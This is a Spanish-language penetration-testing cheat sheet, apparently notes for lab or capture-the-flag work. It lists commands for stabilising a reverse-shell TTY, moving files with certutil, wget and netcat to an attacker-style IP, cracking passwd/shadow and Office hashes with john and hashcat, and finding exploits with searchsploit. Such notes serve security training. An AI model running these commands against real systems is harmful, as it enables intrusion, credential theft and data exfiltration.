 

### Tratamiento de la TTY

```python
script /dev/null -c bash # Lanza pseudoconsola

[ctrl+z] # Suspende la shell actual

stty raw -echo

fg # Recupera la shell suspendida

reset # Reinicia la configuración de la terminal

xterm # Especifica el tipo de terminal

export TERM=xterm # Asigna xterm a la variable TERM

export SHELL=bash # Asigna bash a la variable SHELL

stty rows <VALOR_FILAS> columns <VALOR_COLUMNAS>

Para ver el valor de filas y columnas de nuestra terminal se utiliza el comando -> stty -a
 ```
### TTY Shell con Python

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```
### Descompresión

```python
#.tar

tar -xf archive.tar.gz

#.gz

gzip -d file.gz

#.zip

unzip file.zip
```
### Comparación de archivos

```python
diff -c scan-a.txt scan-b.txt

comm scan-a.txt scan-b.txt
```
### Transferencia de archivos

```python 
#HTTP

#Servidor

python3 -m http.server

python -m SimpleHTTPServer

#Cliente

certutil.exe -urlcache -f http://<SERVER_IP>/file.txt file.txt

wget http://<SERVER_IP>/file.txt


#FTP

#Servidor

python3 -m pyftpdlib

#Cliente

ftp <SERVER_IP>

​

#Netcat

#Servidor

nc 10.10.14.2 4242 < file.tgz

#Cliente

nc -lvnp 4242 > file.tgz

```

### Sniffing

```python
tcpdump -i tun0 icmp -n
 
```
### Cracking

```python
#Básico

john --wordlist=/usr/share/wordlists/rockyou.txt hash

hashcat -a 0 -m 1600 hash /usr/share/wordlists/rockyou.txt
```

### Cracking de contraseñas con passwd y shadow

```python 
unshadow <Archivo_passwd> <Archivo_shadow> > <Archivo_hash>

john --wordlist=<Ruta_Diccionario> <Archivo_hash>
```
### Cracking de documentos encriptados de Office

```python 

office2john.py <Ruta_Documento> > <Archivo_hash>

john --wordlist=<Ruta_Diccionario> <Archivo_hash>
``` 

### Búsqueda de exploits

```python
searchsploit <SOFTWARE>

searchsploit -x <ID_EXPLOIT> # Inspeccionar el código del exploit

searchsploit -m <ID_EXPLOIT> # Mueve el exploit al directorio actual de trabajo
```